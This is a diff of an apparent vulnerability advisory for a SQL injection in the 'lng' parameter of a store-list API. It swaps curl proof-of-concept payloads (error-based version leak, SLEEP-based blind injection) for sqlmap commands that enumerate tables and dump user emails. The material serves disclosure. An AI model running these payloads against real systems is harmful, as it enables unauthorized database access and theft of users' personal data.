@@ -32,31 +32,49 @@ public function list(Request $request)
 ```
 
 #### Proof of Concept
-
-**1. Database Version Extraction**
-
-```bash
-curl -X POST http://localhost:8000/api/v1/front/store/list \
-  -H "Content-Type: application/json" \
-  -d '{"lat":"1","lng":"1'\''))  ,0,0,0,(SELECT version()))#"}'
-
-# Response exposes MySQL version in error message
-```
-
-**2. Time-Based Blind SQL Injection**
-
-```bash
-# Causes 5-second delay, confirming SQL injection
-time curl -X POST http://localhost:8000/api/v1/front/store/list \
-  -H "Content-Type: application/json" \
-  -d '{"lat":"1","lng":"1'\'')) AND SLEEP(5))#"}'
-
-# Expected: ~5 second delay
-```
-
 <img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/b2d7d987-6eff-4daf-9ce7-aa213a6c0acc" />
 
+**Get DB Version & Available DBs**
+```bash
+sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
+  --method=POST \
+  --data='{"lat":"31.182021","lng":"121.425562"}' \
+  --headers="Content-Type: application/json" \
+  -p lng \
+  --banner \
+  --batch
+```
+
 <img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/a20122d0-a444-4c3c-af8d-3e5f4e2a8951" />
+
+**Get All Tables**
+
+```bash
+sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
+  --method=POST \
+  --data='{"lat":"31.182021","lng":"121.425562"}' \
+  --headers="Content-Type: application/json" \
+  -p lng \
+  -D liketea \
+  --tables \
+  --batch
+```
+
+<img width="732" height="371" alt="image" src="https://github.com/user-attachments/assets/3cf3a113-9422-4d25-b9c4-a3c67ef188a7" />
+
+**Get Users**
+```bash
+sqlmap -u "http://localhost:8000/api/v1/front/store/list" \
+  --method=POST \
+  --data='{"lat":"31.182021","lng":"121.425562"}' \
+  --headers="Content-Type: application/json" \
+  -p lng \
+  -D liketea \
+  -T users \
+  -C id,email,type \
+  --dump \
+  --batch
+```
 
 <img width="858" height="371" alt="image" src="https://github.com/user-attachments/assets/3fe2f3a2-6cb9-433f-84c9-27b752d6fa1f" />
 
